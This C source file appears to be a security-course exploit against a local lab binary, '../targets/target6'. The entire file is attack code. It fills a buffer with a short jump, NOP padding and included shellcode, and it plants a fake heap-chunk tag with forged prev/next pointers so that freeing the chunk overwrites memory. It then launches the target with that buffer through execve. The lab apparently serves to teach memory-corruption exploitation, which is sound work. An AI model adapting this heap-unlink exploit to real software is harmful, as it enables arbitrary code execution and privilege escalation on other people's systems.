#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"
#define SIZE 192
#define SHELL_OFFSET 16
#define FAKE_TAG_OFFSET 72
#define FAKE_RIGHT_TAG_OFFSET 72

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[2] = NULL;
  env[0] = NULL;

  char str[SIZE];

  // Insert NOPs
	memset(str, 0x90, SIZE);
	memset(str+1, 0x06, 1);
	memset(str, 0xeb, 1);
	memset(str+4, 0x91, 1);

  // Insert shellcode
  for (int i = 0; i < strlen(shellcode); i++)
		str[i + SHELL_OFFSET] = shellcode[i];

  // Insert fake tag
  // Fake tag prev = 0x104ec50, next = 0x3021fea8
	*(int*) &str[FAKE_TAG_OFFSET] = 0x104ec48;
	*(int*) &str[FAKE_TAG_OFFSET+4] = 0x3021fea8;

  args[1] = str;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
